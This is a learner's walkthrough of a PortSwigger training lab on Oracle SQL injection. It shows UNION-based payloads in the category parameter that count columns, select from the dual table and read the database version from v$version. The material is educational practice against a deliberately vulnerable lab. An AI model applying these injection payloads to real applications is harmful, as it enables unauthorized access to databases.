https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

Lab objective: `Display the database version string.`

# Lab: SQL injection attack, querying the database type and version on Oracle

We know that this lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

So we will click one of the item. i will Gifts category.

![[Sqli Lab 3.png]]

Now we will find how many column have in this table.

If we use `category=Gifts' ORDER BY 2--` it give result

but if we use `category=Gifts' ORDER BY 3--` it does not give result

![[Sqli Lab 3-1.png]]

now we need to check column type so we will use `category=-Gifts' UNION SELECT 'A', 'B'--`

![[Sqli Lab 3-2.png]]

In `Oracle` we need to put a table name and in `Oracle` there have a default table name dual.

So, now we need to change the query little bit. `category=-Gifts' UNION SELECT 'A', 'B' FROM dual--`

And we confirm table type is `string`.

![[Sqli Lab 3-3.png]]

For finding the `Oracle` Database version of the database the query is `SELECT banner FROM v$version`

So, our query will `category=-Gifts' UNION SELECT banner, NULL FROM v$version--`


![[Sqli Lab 3-4.png]]
![[Sqli Lab 3-5.png]]

At the end our lab is complete.